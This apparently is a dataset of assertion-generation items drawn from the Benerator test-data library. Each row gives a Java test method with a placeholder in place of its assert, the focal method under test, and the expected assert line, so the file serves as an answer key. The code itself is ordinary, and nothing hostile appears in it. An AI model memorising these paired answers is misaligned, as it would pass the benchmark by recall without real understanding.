convert(String sourceValue) throws ConversionException { if (sourceValue == null || sourceValue.isEmpty()) { return sourceValue; } return (sourceValue.length() > maxLength ? sourceValue.substring(0, maxLength) : sourceValue);  }"	assertNull(c.convert(null))
"testNull() { Mask m = new Mask(); ""<AssertPlaceHolder>""; }
convert(Object sourceValue) throws ConversionException { if (sourceValue == null) { return null; } String string = ToStringConverter.convert(sourceValue, null); int length = string.length(); char[] chars = new char[string.length()]; Arrays.fill(chars, 0, length, maskChar); return new String(chars); }"	assertNull(m.convert(null))
"testConvertNull() { MiddleMask m = new MiddleMask(3, 2); ""<AssertPlaceHolder>""; }
convert(String sourceValue) throws ConversionException { if (sourceValue == null) { return null; } int length = sourceValue.length(); if (length < fromHead) { return sourceValue; } char[] chars = new char[sourceValue.length()]; sourceValue.getChars(0, chars.length, chars, 0); int max = Math.max(length - fromTail, fromHead); Arrays.fill(chars, fromHead, max, mask); return new String(chars); }"	assertNull(m.convert(null))
"testAtomicSet() { Dataset set = DatasetUtil.getDataset(REGION, ""DE""); ""<AssertPlaceHolder>""; }
getName() { return name; }"	"assertEquals(""DE"", set.getName())"
"testEmpty() { ScriptableExpression expression = new ScriptableExpression(null, null); ""<AssertPlaceHolder>""; }
evaluate(Context context) { Object result; if (scriptOrText == null) { result = (defaultValueExpression != null ? defaultValueExpression.evaluate(context) : null); } else if (isScript) { result = ScriptUtil.evaluate(scriptOrText, context); } else { result = scriptOrText; } return result; }"	assertNull(expression.evaluate(context))
"testDefault() { ScriptableExpression expression = new ScriptableExpression(null, ""Hi there""); ""<AssertPlaceHolder>""; }
evaluate(Context context) { Object result; if (scriptOrText == null) { result = (defaultValueExpression != null ? defaultValueExpression.evaluate(context) : null); } else if (isScript) { result = ScriptUtil.evaluate(scriptOrText, context); } else { result = scriptOrText; } return result; }"	"assertEquals(""Hi there"", expression.evaluate(context))"
"testText() { ScriptableExpression expression = new ScriptableExpression(""Hello World"", null); ""<AssertPlaceHolder>""; }
evaluate(Context context) { Object result; if (scriptOrText == null) { result = (defaultValueExpression != null ? defaultValueExpression.evaluate(context) : null); } else if (isScript) { result = ScriptUtil.evaluate(scriptOrText, context); } else { result = scriptOrText; } return result; }"	"assertEquals(""Hello World"", expression.evaluate(context))"
"testScript() { ScriptableExpression expression = new ScriptableExpression(""{'Hi ' + user}"", ""???""); ""<AssertPlaceHolder>""; }
evaluate(Context context) { Object result; if (scriptOrText == null) { result = (defaultValueExpression != null ? defaultValueExpression.evaluate(context) : null); } else if (isScript) { result = ScriptUtil.evaluate(scriptOrText, context); } else { result = scriptOrText; } return result; }"	"assertEquals(""Hi myself"", expression.evaluate(context))"
"testInlineConsumerClass() { Document doc = XMLUtil.parseString(""<generate "" + ""consumer='com.rapiddweller.benerator.factory.ConsumerMock'/>""); XMLConsumerExpression expression = new XMLConsumerExpression(doc.getDocumentElement(), true, new ResourceManagerSupport()); ConsumerMock consumerMock = (ConsumerMock) expression.evaluate(new DefaultBeneratorContext()); ""<AssertPlaceHolder>""; }
evaluate(Context context) { BeneratorContext beneratorContext = (BeneratorContext) context; ConsumerChain consumerChain = new ConsumerChain();  // parse consumer attribute if (entityElement.hasAttribute(ATT_CONSUMER)) { String consumerSpec = parseStringAttribute(entityElement, ATT_CONSUMER, context); BeanSpec[] beanSpecs = DatabeneScriptParser.resolveBeanSpecList(consumerSpec, beneratorContext); if (beanSpecs != null) { String sourceTableName = beneratorContext.getCurrentProductName(); for (BeanSpec beanSpec : beanSpecs) { var bean = beanSpec.getBean(); if (bean instanceof StorageSystemInserter) { if (((StorageSystemInserter) bean).getTargetType().getName().equals(sourceTableName)) { throw new RuntimeException(""Source and destination table must be different from each other. Table/Collection name: "" + sourceTableName); } } addConsumer(beanSpec, beneratorContext, consumerChain); } } }  // parse consumer sub elements Element[] consumerElements = XMLUtil.getChildElements(entityElement, true, EL_CONSUMER); for (Element consumerElement : consumerElements) { BeanSpec beanSpec; if (consumerElement.hasAttribute(ATT_REF)) { String ref = parseStringAttribute(consumerElement, ATT_REF, context); beanSpec = BeanSpec.createReference(beneratorContext.get(ref)); } else if (consumerElement.hasAttribute(ATT_CLASS) || consumerElement.hasAttribute(ATT_SPEC)) { beanSpec = BeanParser.resolveLocalBeanExpression(consumerElement, beneratorContext); } else { throw BeneratorExceptionFactory.getInstance().syntaxErrorForXmlElement( ""Can't handle this"", consumerElement); } addConsumer(beanSpec, beneratorContext, consumerChain); }  if (consumerChain.componentCount() == 0 && consumersExpected) { String entityName = parseStringAttribute(entityElement, ATT_NAME, context, false); escalator.escalate(""No consumers defined for "" + entityName, this, null); } for (Consumer consumer : consumerChain.getComponents()) { resourceManager.addResource(consumer); } return (consumerChain.componentCount() == 1 ? consumerChain.getComponent(0) : consumerChain); }"	"assertNotNull(""Context not set"", consumerMock.context)"
"testConsumerBean() { Document doc = XMLUtil.parseString(""<generate>"" + ""    <consumer spec='new com.rapiddweller.benerator.factory.ConsumerMock()'/>"" + ""</generate>""); XMLConsumerExpression expression = new XMLConsumerExpression(doc.getDocumentElement(), true, new ResourceManagerSupport()); ConsumerMock consumerMock = (ConsumerMock) expression.evaluate(new DefaultBeneratorContext()); ""<AssertPlaceHolder>""; }
evaluate(Context context) { BeneratorContext beneratorContext = (BeneratorContext) context; ConsumerChain consumerChain = new ConsumerChain();  // parse consumer attribute if (entityElement.hasAttribute(ATT_CONSUMER)) { String consumerSpec = parseStringAttribute(entityElement, ATT_CONSUMER, context); BeanSpec[] beanSpecs = DatabeneScriptParser.resolveBeanSpecList(consumerSpec, beneratorContext); if (beanSpecs != null) { String sourceTableName = beneratorContext.getCurrentProductName(); for (BeanSpec beanSpec : beanSpecs) { var bean = beanSpec.getBean(); if (bean instanceof StorageSystemInserter) { if (((StorageSystemInserter) bean).getTargetType().getName().equals(sourceTableName)) { throw new RuntimeException(""Source and destination table must be different from each other. Table/Collection name: "" + sourceTableName); } } addConsumer(beanSpec, beneratorContext, consumerChain); } } }  // parse consumer sub elements Element[] consumerElements = XMLUtil.getChildElements(entityElement, true, EL_CONSUMER); for (Element consumerElement : consumerElements) { BeanSpec beanSpec; if (consumerElement.hasAttribute(ATT_REF)) { String ref = parseStringAttribute(consumerElement, ATT_REF, context); beanSpec = BeanSpec.createReference(beneratorContext.get(ref)); } else if (consumerElement.hasAttribute(ATT_CLASS) || consumerElement.hasAttribute(ATT_SPEC)) { beanSpec = BeanParser.resolveLocalBeanExpression(consumerElement, beneratorContext); } else { throw BeneratorExceptionFactory.getInstance().syntaxErrorForXmlElement( ""Can't handle this"", consumerElement); } addConsumer(beanSpec, beneratorContext, consumerChain); }  if (consumerChain.componentCount() == 0 && consumersExpected) { String entityName = parseStringAttribute(entityElement, ATT_NAME, context, false); escalator.escalate(""No consumers defined for "" + entityName, this, null); } for (Consumer consumer : consumerChain.getComponents()) { resourceManager.addResource(consumer); } return (consumerChain.componentCount() == 1 ? consumerChain.getComponent(0) : consumerChain); }"	"assertNotNull(""Context not set"", consumerMock.context)"
"testConsumerBeanRef() { Document doc = XMLUtil.parseString(""<generate>"" + ""    <consumer ref='myc'/>"" + ""</generate>""); XMLConsumerExpression expression = new XMLConsumerExpression(doc.getDocumentElement(), true, new ResourceManagerSupport()); BeneratorContext context = new DefaultBeneratorContext(); context.setGlobal(""myc"", new ConsumerMock(3)); NonClosingConsumerProxy consumer = (NonClosingConsumerProxy) expression.evaluate(context); ConsumerMock consumerMock = (ConsumerMock) consumer.getTarget(); ""<AssertPlaceHolder>""; }
evaluate(Context context) { BeneratorContext beneratorContext = (BeneratorContext) context; ConsumerChain consumerChain = new ConsumerChain();  // parse consumer attribute if (entityElement.hasAttribute(ATT_CONSUMER)) { String consumerSpec = parseStringAttribute(entityElement, ATT_CONSUMER, context); BeanSpec[] beanSpecs = DatabeneScriptParser.resolveBeanSpecList(consumerSpec, beneratorContext); if (beanSpecs != null) { String sourceTableName = beneratorContext.getCurrentProductName(); for (BeanSpec beanSpec : beanSpecs) { var bean = beanSpec.getBean(); if (bean instanceof StorageSystemInserter) { if (((StorageSystemInserter) bean).getTargetType().getName().equals(sourceTableName)) { throw new RuntimeException(""Source and destination table must be different from each other. Table/Collection name: "" + sourceTableName); } } addConsumer(beanSpec, beneratorContext, consumerChain); } } }  // parse consumer sub elements Element[] consumerElements = XMLUtil.getChildElements(entityElement, true, EL_CONSUMER); for (Element consumerElement : consumerElements) { BeanSpec beanSpec; if (consumerElement.hasAttribute(ATT_REF)) { String ref = parseStringAttribute(consumerElement, ATT_REF, context); beanSpec = BeanSpec.createReference(beneratorContext.get(ref)); } else if (consumerElement.hasAttribute(ATT_CLASS) || consumerElement.hasAttribute(ATT_SPEC)) { beanSpec = BeanParser.resolveLocalBeanExpression(consumerElement, beneratorContext); } else { throw BeneratorExceptionFactory.getInstance().syntaxErrorForXmlElement( ""Can't handle this"", consumerElement); } addConsumer(beanSpec, beneratorContext, consumerChain); }  if (consumerChain.componentCount() == 0 && consumersExpected) { String entityName = parseStringAttribute(entityElement, ATT_NAME, context, false); escalator.escalate(""No consumers defined for "" + entityName, this, null); } for (Consumer consumer : consumerChain.getComponents()) { resourceManager.addResource(consumer); } return (consumerChain.componentCount() == 1 ? consumerChain.getComponent(0) : consumerChain); }"	assertEquals(3, consumerMock.id)
"testParse_regular() { DefaultBeneratorContext context = new DefaultBeneratorContext(); context.setDefaultEncoding(""iso-8859-1""); ""<AssertPlaceHolder>""; }
evaluate(Context context) { return ((BeneratorContext) context).getDefaultEncoding(); }"	"assertEquals(""UTF-8"", parser.parse(""UTF-8"").evaluate(context))"
"testParse_fallback() { DefaultBeneratorContext context = new DefaultBeneratorContext(); context.setDefaultEncoding(""iso-8859-1""); ""<AssertPlaceHolder>""; }
evaluate(Context context) { return ((BeneratorContext) context).getDefaultEncoding(); }"	"assertEquals(""iso-8859-1"", parser.parse(null).evaluate(context))"
"testParse_default() { DefaultBeneratorContext context = new DefaultBeneratorContext(); ""<AssertPlaceHolder>""; }
evaluate(Context context) { return ((BeneratorContext) context).getDefaultEncoding(); }"	assertEquals(SystemInfo.getFileEncoding(), parser.parse(null).evaluate(context))
"testParseScriptableStringArrayAttribute_defined() { Element element = XMLUtil.parseStringAsElement(""<x array='Alice,Bob,Charly'/>""); Expression<String[]> actualEx = DescriptorParserUtil.parseScriptableStringArrayAttribute(""array"", element); String[] actual = ExpressionUtil.evaluate(actualEx, null); String[] expected = new String[] { ""Alice"", ""Bob"", ""Charly"" }; ""<AssertPlaceHolder>""; }
parseScriptableStringArrayAttribute(String name, Element element) { String attribute = getAttributeAsString(name, element); if (attribute == null) { return null; } Expression<String> rawEx = new TypeConvertingExpression<>( new ScriptableExpression(attribute, null), String.class); return new ConvertingExpression<>(rawEx, new SplitStringConverter(',')); }"	assertArrayEquals(expected, actual)
"testCache2() { ""<AssertPlaceHolder>""; }
cache(Expression<T> expression) { return (expression != null ? new CachedExpression<>(expression) : null); }"	assertNull(AbstractStatement.<Object>cache(null))
"testGeneratorFactoryConfig() { Map<String, String> attributes = CollectionUtil.buildMap( ""generatorFactory"", EquivalenceGeneratorFactory.class.getName()); BeneratorRootStatement root = new BeneratorRootStatement(attributes); try { root.execute(context); ""<AssertPlaceHolder>""; } finally { IOUtil.close(root); } }
execute(BeneratorContext context) { mapAttributesTo(context); if (context.isDefaultImports()) { context.importDefaults(); } super.execute(context); return true; }"	assertEquals(EquivalenceGeneratorFactory.class, context.getGeneratorFactory().getClass())
"testEvaluateAssertion_true() { ""<AssertPlaceHolder>""; }
evaluateAssertion(Expression<?> assertionEx, Object result, String onErrorValue, BeneratorContext context) { Object assertionValue = ExpressionUtil.evaluate(assertionEx, context); if (assertionValue instanceof String) { assertionValue = LiteralParserConverter.parse((String) assertionValue); } if (assertionValue != null && !(assertionValue instanceof String && ((String) assertionValue).length() == 0)) { if (assertionValue instanceof Boolean) { if (!(boolean) assertionValue) { getErrorHandler(onErrorValue).handleError(""Assertion failed: '"" + assertionEx + ""'""); return false; } } else { if (!BeanUtil.equalsIgnoreType(assertionValue, result)) { getErrorHandler(onErrorValue).handleError(""Assertion failed. Expected: '"" + assertionValue + ""', found: '"" + result + ""'""); return false; } } } return true; }"	"assertTrue(EvaluateStatement.evaluateAssertion(expression(""true""), null, ""fatal"", context))"
"testEvaluateAssertion_false_warn() { ""<AssertPlaceHolder>""; }
evaluateAssertion(Expression<?> assertionEx, Object result, String onErrorValue, BeneratorContext context) { Object assertionValue = ExpressionUtil.evaluate(assertionEx, context); if (assertionValue instanceof String) { assertionValue = LiteralParserConverter.parse((String) assertionValue); } if (assertionValue != null && !(assertionValue instanceof String && ((String) assertionValue).length() == 0)) { if (assertionValue instanceof Boolean) { if (!(boolean) assertionValue) { getErrorHandler(onErrorValue).handleError(""Assertion failed: '"" + assertionEx + ""'""); return false; } } else { if (!BeanUtil.equalsIgnoreType(assertionValue, result)) { getErrorHandler(onErrorValue).handleError(""Assertion failed. Expected: '"" + assertionValue + ""', found: '"" + result + ""'""); return false; } } } return true; }"	"assertFalse(EvaluateStatement.evaluateAssertion(expression(""false""), null, ""warn"", context))"
"testEvaluateAssertion_ex_true() { ""<AssertPlaceHolder>""; }
evaluateAssertion(Expression<?> assertionEx, Object result, String onErrorValue, BeneratorContext context) { Object assertionValue = ExpressionUtil.evaluate(assertionEx, context); if (assertionValue instanceof String) { assertionValue = LiteralParserConverter.parse((String) assertionValue); } if (assertionValue != null && !(assertionValue instanceof String && ((String) assertionValue).length() == 0)) { if (assertionValue instanceof Boolean) { if (!(boolean) assertionValue) { getErrorHandler(onErrorValue).handleError(""Assertion failed: '"" + assertionEx + ""'""); return false; } } else { if (!BeanUtil.equalsIgnoreType(assertionValue, result)) { getErrorHandler(onErrorValue).handleError(""Assertion failed. Expected: '"" + assertionValue + ""', found: '"" + result + ""'""); return false; } } } return true; }"	"assertTrue(EvaluateStatement.evaluateAssertion(expression(""42""), 42, ""fatal"", context))"
"testEvaluateAssertion_ex_false_warn() { ""<AssertPlaceHolder>""; }
evaluateAssertion(Expression<?> assertionEx, Object result, String onErrorValue, BeneratorContext context) { Object assertionValue = ExpressionUtil.evaluate(assertionEx, context); if (assertionValue instanceof String) { assertionValue = LiteralParserConverter.parse((String) assertionValue); } if (assertionValue != null && !(assertionValue instanceof String && ((String) assertionValue).length() == 0)) { if (assertionValue instanceof Boolean) { if (!(boolean) assertionValue) { getErrorHandler(onErrorValue).handleError(""Assertion failed: '"" + assertionEx + ""'""); return false; } } else { if (!BeanUtil.equalsIgnoreType(assertionValue, result)) { getErrorHandler(onErrorValue).handleError(""Assertion failed. Expected: '"" + assertionValue + ""', found: '"" + result + ""'""); return false; } } } return true; }"	"assertFalse(EvaluateStatement.evaluateAssertion(expression(""42""), 4711, ""warn"", context))"
"testInlineJavaScript() { EvaluateStatement stmt = new EvaluateStatement( true, ""message"", constant(""'Hello World'""), null, null, null, null, null, constant(""fatal""), constant(Encodings.UTF_8), constant(false), null, null, null); stmt.execute(context); ""<AssertPlaceHolder>""; }
execute(BeneratorContext context) { try { String onErrorValue = ExpressionUtil.evaluateWithDefault(onErrorEx, ""fatal"", context); String uriValue = evaluateUri(context); Object targetObject = ExpressionUtil.evaluate(targetObjectEx, context); String typeValue = evaluateType(context, uriValue, targetObject); String encoding = ExpressionUtil.evaluate(encodingEx, context); String text = ExpressionUtil.evaluate(textEx, context); String shell = ExpressionUtil.evaluate(shellEx, context);  // run Object result; if (TYPE_SQL.equals(typeValue)) { result = evaluateAsSql(context, onErrorValue, uriValue, targetObject, encoding, text); } else if (TYPE_SHELL.equals(typeValue) || !StringUtil.isEmpty(shell)) { result = runShell(uriValue, text, shell, onErrorValue); } else if (EXECUTE_SQL.equals(typeValue)) { result = ((StorageSystem) targetObject).execute(text); } else { result = evaluateAsScript(context, onErrorValue, uriValue, typeValue, text); } context.setGlobal(""result"", result); evaluateAssertion(assertionEx, result, onErrorValue, context); exportResultWithId(result, context); return true; } catch (ConversionException e) { throw ExceptionFactory.getInstance().configurationError(""Error executing statement"", e); } }"	"assertEquals(""Hello World"", context.get(""message""))"
"testRunScript() { context.set(""name"", ""Volker""); Object result = EvaluateStatement.runScript(""Hello ${name}"", ""ftl"", ""fatal"", context, null); ""<AssertPlaceHolder>""; }
runScript( String text, String type, String onError, Context context, TextFileLocation location) { ErrorHandler errorHandler = new ErrorHandler(EvaluateStatement.class.getName(), Level.valueOf(onError)); boolean evaluating = false; try { Script script = ScriptUtil.parseScriptText(text, type); evaluating = true; return script.evaluate(context); } catch (Exception e) { RuntimeException e2; if (evaluating) { e2 = BeneratorExceptionFactory.getInstance().scriptEvaluationFailed( ""Error evaluating script"", e, text, location); } else { e2 = BeneratorExceptionFactory.getInstance().syntaxErrorForText( ""Error parsing script"", e, BeneratorErrorIds.SYN_EVALUATE_TEXT, location); } errorHandler.handleError(e2.getMessage(), e2); return null; } }"	"assertEquals(""Hello Volker"", result)"
"testRunScript_error_warn() { TextFileLocation location = new TextFileLocation(""file.js"", 5, 7, 6, 8); Object result = EvaluateStatement.runScript(""Hello ${name}"", ""ftl"", ""warn"", context, location); ""<AssertPlaceHolder>""; }
runScript( String text, String type, String onError, Context context, TextFileLocation location) { ErrorHandler errorHandler = new ErrorHandler(EvaluateStatement.class.getName(), Level.valueOf(onError)); boolean evaluating = false; try { Script script = ScriptUtil.parseScriptText(text, type); evaluating = true; return script.evaluate(context); } catch (Exception e) { RuntimeException e2; if (evaluating) { e2 = BeneratorExceptionFactory.getInstance().scriptEvaluationFailed( ""Error evaluating script"", e, text, location); } else { e2 = BeneratorExceptionFactory.getInstance().syntaxErrorForText( ""Error parsing script"", e, BeneratorErrorIds.SYN_EVALUATE_TEXT, location); } errorHandler.handleError(e2.getMessage(), e2); return null; } }"	assertNull(result)
"testUriMapping() { EvaluateStatement stmt = new EvaluateStatement( true, ""message"", null, constant(""/com/rapiddweller/benerator/engine/statement/HelloWorld.js""), null, null, null, null, constant(""fatal""), constant(Encodings.UTF_8), constant(false), null, null, null); stmt.execute(context); ""<AssertPlaceHolder>""; }
execute(BeneratorContext context) { try { String onErrorValue = ExpressionUtil.evaluateWithDefault(onErrorEx, ""fatal"", context); String uriValue = evaluateUri(context); Object targetObject = ExpressionUtil.evaluate(targetObjectEx, context); String typeValue = evaluateType(context, uriValue, targetObject); String encoding = ExpressionUtil.evaluate(encodingEx, context); String text = ExpressionUtil.evaluate(textEx, context); String shell = ExpressionUtil.evaluate(shellEx, context);  // run Object result; if (TYPE_SQL.equals(typeValue)) { result = evaluateAsSql(context, onErrorValue, uriValue, targetObject, encoding, text); } else if (TYPE_SHELL.equals(typeValue) || !StringUtil.isEmpty(shell)) { result = runShell(uriValue, text, shell, onErrorValue); } else if (EXECUTE_SQL.equals(typeValue)) { result = ((StorageSystem) targetObject).execute(text); } else { result = evaluateAsScript(context, onErrorValue, uriValue, typeValue, text); } context.setGlobal(""result"", result); evaluateAssertion(assertionEx, result, onErrorValue, context); exportResultWithId(result, context); return true; } catch (ConversionException e) { throw ExceptionFactory.getInstance().configurationError(""Error executing statement"", e); } }"	"assertEquals(""Hello World"", context.get(""message""))"
"testStorageSystem() { StSys stSys = new StSys(); Expression<StSys> stSysEx = ExpressionUtil.constant(stSys); EvaluateStatement stmt = new EvaluateStatement( true, ""message"", constant(""HelloHi""), null, null, stSysEx, null, null, constant(""fatal""), constant(Encodings.UTF_8), constant(false), null, null, null); stmt.execute(context); ""<AssertPlaceHolder>""; }
execute(BeneratorContext context) { try { String onErrorValue = ExpressionUtil.evaluateWithDefault(onErrorEx, ""fatal"", context); String uriValue = evaluateUri(context); Object targetObject = ExpressionUtil.evaluate(targetObjectEx, context); String typeValue = evaluateType(context, uriValue, targetObject); String encoding = ExpressionUtil.evaluate(encodingEx, context); String text = ExpressionUtil.evaluate(textEx, context); String shell = ExpressionUtil.evaluate(shellEx, context);  // run Object result; if (TYPE_SQL.equals(typeValue)) { result = evaluateAsSql(context, onErrorValue, uriValue, targetObject, encoding, text); } else if (TYPE_SHELL.equals(typeValue) || !StringUtil.isEmpty(shell)) { result = runShell(uriValue, text, shell, onErrorValue); } else if (EXECUTE_SQL.equals(typeValue)) { result = ((StorageSystem) targetObject).execute(text); } else { result = evaluateAsScript(context, onErrorValue, uriValue, typeValue, text); } context.setGlobal(""result"", result); evaluateAssertion(assertionEx, result, onErrorValue, context); exportResultWithId(result, context); return true; } catch (ConversionException e) { throw ExceptionFactory.getInstance().configurationError(""Error executing statement"", e); } }"	"assertEquals(""HelloHi"", stSys.execInfo)"
"testFlat() { // setup final ListConsumer consumer = new ListConsumer(); Expression<Consumer> consumerExpr = new ConstantExpression<>(consumer); GenIterTask task = new GenIterTask(""tn"", ""tn""); Generator<Entity> source = new IteratingGenerator<>(new AB()); task.addStatement(new CurrentProductGeneration(""in"", source)); task.setConsumer(consumerExpr); // test initial behavior checkIteration(task, consumer); consumer.clear(); // test reset() task.reset(); checkIteration(task, consumer); // close task.close(); ""<AssertPlaceHolder>""; }
getTaskName() { return taskName; }"	"assertEquals(""tn"", task.getTaskName())"
"testHashCode() { Environment env = new Environment(""env1""); ""<AssertPlaceHolder>""; }
hashCode() { return Objects.hash(name); }"	assertEquals(3118339, env.hashCode())
"testToString() { Environment env = new Environment(""env1""); ""<AssertPlaceHolder>""; }
toString() { return name; }"	"assertEquals(""env1"", env.toString())"
"testFindEnvironments_global_smoketest() { Map<String, Environment> environments = EnvironmentUtil.findEnvironments(); ""<AssertPlaceHolder>""; }
findEnvironments() { return findEnvironments("".""); }"	assertNotNull(environments)
"testParse() { Environment environment = EnvironmentUtil.parse(""unittest"", PROJECT_FOLDER); ""<AssertPlaceHolder>""; verifyUnittestEnvironment(environment); }
parse(String envName, String projectFolder) { String filename = fileName(envName); try { String filePath = ConfigUtil.configFilePathDefaultLocations(filename, projectFolder); return parseFile(envName, filePath); } catch (Exception e) { throw ExceptionFactory.getInstance().configurationError(""Error parsing environment file "" + filename, e); } }"	"assertEquals(""unittest"", environment.getName())"
"testGetDbProductDescription() { SystemRef dbSystem = createDbTestSystem(); try { String description = EnvironmentUtil.getDbProductDescription(dbSystem); ""<AssertPlaceHolder>""; } finally { HSQLUtil.shutdown(dbSystem.getProperty(""url""), HSQLUtil.DEFAULT_USER, HSQLUtil.DEFAULT_PASSWORD); } }
getDbProductDescription(SystemRef system) { try (Connection connection = connectDb(system)) { DatabaseMetaData metaData = connection.getMetaData(); return metaData.getDatabaseProductName() + "" "" + VersionNumber.valueOf(metaData.getDatabaseProductVersion()); } catch (ConnectFailedException e) { throw ExceptionFactory.getInstance().connectFailed( ""Failed to connect database "" + system.getName(), e); } catch (SQLException e) { throw ExceptionFactory.getInstance().serviceFailed( ""Meta data retrieval failed for database "" + system.getName(), e); } }"	"assertTrue(description.startsWith(""HSQL Database Engine ""))"
"testGetDbDialect() { SystemRef dbSystem = createDbTestSystem(); try { DatabaseDialect dbDialect = EnvironmentUtil.getDbDialect(dbSystem); ""<AssertPlaceHolder>""; } finally { HSQLUtil.shutdown(dbSystem.getProperty(""url""), HSQLUtil.DEFAULT_USER, HSQLUtil.DEFAULT_PASSWORD); } }
getDbDialect(SystemRef system) { try (Connection connection = connectDb(system)) { DatabaseMetaData metaData = connection.getMetaData(); String databaseProductName = metaData.getDatabaseProductName(); VersionNumber databaseProductVersion = VersionNumber.valueOf(metaData.getDatabaseProductVersion()); return DatabaseDialectManager.getDialectForProduct(databaseProductName, databaseProductVersion); } catch (ConnectFailedException e) { throw ExceptionFactory.getInstance().connectFailed( ""Failed to connect database "" + system.getName(), e); } catch (SQLException e) { throw ExceptionFactory.getInstance().serviceFailed( ""Meta data retrieval failed for database "" + system.getName(), e); } }"	"assertEquals(""hsql"", dbDialect.getDbType())"
"SQLException { SystemRef system = createDbTestSystem(); Connection connection = EnvironmentUtil.connectDb(system); try { connection = EnvironmentUtil.connectDb(system); ""<AssertPlaceHolder>""; } finally { connection.close(); HSQLUtil.shutdown(system.getProperty(""url""), HSQLUtil.DEFAULT_USER, HSQLUtil.DEFAULT_PASSWORD); } }
connectDb(SystemRef system) throws ConnectFailedException { if (!system.isDb()) { throw ExceptionFactory.getInstance().configurationError(""Not a database: "" + system.getName() + "" in environment "" + system.getEnvironment().getName()); } Map<String, String> pp = system.getProperties(); String readOnlySpec = pp.get(""readOnly""); boolean readOnly = (!StringUtil.isEmpty(readOnlySpec) && Boolean.parseBoolean(readOnlySpec)); return DBUtil.connect(pp.get(""url""), pp.get(""driver""), pp.get(""user""), pp.get(""password""), readOnly); }"	assertNotNull(connection)
"testDefaultSubSet() { Set<Character> chars = CollectionUtil.toSet('A', 'B', 'C'); ""<AssertPlaceHolder>""; }
defaultSubSet(Set<Character> characters) { return characters; }"	assertEquals(chars, factory.defaultSubSet(chars))
"testDefaultCounts() { Set<Integer> defaultCounts = factory.defaultCounts(1, 5, 2); ""<AssertPlaceHolder>""; }
defaultCounts(int minParts, int maxParts, int partsGranularity) { TreeSet<Integer> counts = new TreeSet<>(); for (int i = minParts; i <= maxParts; i += partsGranularity) { counts.add(i); } return counts; }"	assertEquals(CollectionUtil.toSet(1, 3, 5), defaultCounts)
"testDefaultDistribution() { ""<AssertPlaceHolder>""; }
defaultDistribution(Uniqueness uniqueness) { return SequenceManager.STEP_SEQUENCE; }"	assertEquals(SequenceManager.STEP_SEQUENCE, factory.defaultDistribution(Uniqueness.NONE))
"testCreateSampleGeneratorWithoutValues() { Generator<?> generator = SimpleTypeGeneratorFactory.createValuesGenerator(createSimpleType(""test""), Uniqueness.NONE, null); ""<AssertPlaceHolder>""; }
createValuesGenerator( SimpleTypeDescriptor descriptor, Uniqueness uniqueness, BeneratorContext context) { PrimitiveType primitiveType = descriptor.getPrimitiveType(); Class<?> targetType = (primitiveType != null ? primitiveType.getJavaType() : String.class); String valueSpec = descriptor.getValues(); if (valueSpec == null) { return null; } if ("""".equals(valueSpec)) { return new ConstantGenerator<>(""""); } try { Distribution distribution = FactoryUtil.getDistribution(descriptor.getDistribution(), uniqueness, false, context); return context.getGeneratorFactory().createFromWeightedLiteralList(valueSpec, targetType, distribution, uniqueness.isUnique()); } catch (ParseException e) { throw BeneratorExceptionFactory.getInstance().configurationError(""Error parsing samples: "" + valueSpec, e); } }"	assertNull(generator)
"testJavaInvocation() { AddingConsumer consumer = new AddingConsumer(); try { consumer.setFeature(""age""); consumer.setType(""int""); consumer.startProductConsumption(ALICE); consumer.finishProductConsumption(ALICE); consumer.startProductConsumption(METHUSALEM); consumer.finishProductConsumption(METHUSALEM); ""<AssertPlaceHolder>""; } finally { IOUtil.close(consumer); } }
getSum() { return this.sum; }"	assertEquals(1047, consumer.getSum())
"testWithoutSeparator() { HibUUIDGenerator generator = new HibUUIDGenerator(); generator.init(context); for (int i = 0; i < 5; i++) { String id = generator.generate(); ""<AssertPlaceHolder>""; } }
generate() { long time = System.currentTimeMillis(); short count = (short) counter.getAndIncrement(); if (count < 0) { count += Short.MAX_VALUE + 1; } return ipJvm + NumberUtil.formatHex((short) (time >>> 32), 4) + separator + NumberUtil.formatHex((int) time, 8) + separator + NumberUtil.formatHex(count, 4); }"	assertEquals(32, id.length())
"Exception { final IncrementGenerator generator = new IncrementGenerator(0); generator.init(context); ExecutorService service = Executors.newCachedThreadPool(); Runnable runner = () -> { for (int i = 0; i < 500; i++) { generator.generate(); } }; for (int i = 0; i < 20; i++) { service.execute(runner); } service.shutdown(); service.awaitTermination(2, TimeUnit.SECONDS); ""<AssertPlaceHolder>""; }
generate() { return cursor.getAndAdd(increment); }"	assertEquals(10000L, generator.cursor.get())
"Exception { final IncrementGenerator generator = new IncrementGenerator(0); ExecutorService service = Executors.newCachedThreadPool(); Runnable runner = () -> { for (int i = 0; i < 500; i++) { generator.generate(); } }; for (int i = 0; i < 20; i++) { service.execute(runner); } service.shutdown(); service.awaitTermination(2, TimeUnit.SECONDS); ""<AssertPlaceHolder>""; }
generate() { long result = cursor.getAndAdd(increment); return (result <= max ? result : null); }"	assertEquals(10000L, generator.cursor.get())
"testIsParallelizable_non_unique() { ""<AssertPlaceHolder>""; }
isParallelizable() { return !isUnique(); }"	assertTrue((new RegexStringGenerator()).isParallelizable())
"testIsParallelizable_unique() { RegexStringGenerator regexStringGenerator = new RegexStringGenerator(); regexStringGenerator.setUnique(true); ""<AssertPlaceHolder>""; }
isParallelizable() { return !isUnique(); }"	assertFalse(regexStringGenerator.isParallelizable())
"testToString() { ""<AssertPlaceHolder>""; }
toString() { return getClass().getSimpleName() + ""["" + (unique ? ""unique '"" : ""'"") + pattern + ""']""; }"	"assertEquals(""RegexStringGenerator['null']"", (new RegexStringGenerator()).toString())"
"testToString_unique() { RegexStringGenerator regexStringGenerator = new RegexStringGenerator(); regexStringGenerator.setUnique(true); ""<AssertPlaceHolder>""; }
toString() { return getClass().getSimpleName() + ""["" + (unique ? ""unique '"" : ""'"") + pattern + ""']""; }"	"assertEquals(""RegexStringGenerator[unique 'null']"", regexStringGenerator.toString())"
"Exception { SeedSentenceGenerator generator = new SeedSentenceGenerator(""license.txt""); generator.init(context); for (int i = 0; i < 10; i++) { String sentence = generator.generate(); ""<AssertPlaceHolder>""; } }
generate() { return toString(generateFromNotNullSource()); }"	assertNotNull(sentence)
"testSetMax() { DateGenerator dateGenerator = new DateGenerator(); LocalDateTime atStartOfDayResult = LocalDate.of(1970, 1, 1).atStartOfDay(); Date maxDate = Date.from(atStartOfDayResult.atZone(ZoneId.of(""UTC"")).toInstant()); dateGenerator.setMax(maxDate); DefaultBeneratorContext context = new DefaultBeneratorContext(); dateGenerator.init(context); for (int i = 0; i < 1000; i++) { ""<AssertPlaceHolder>""; } }
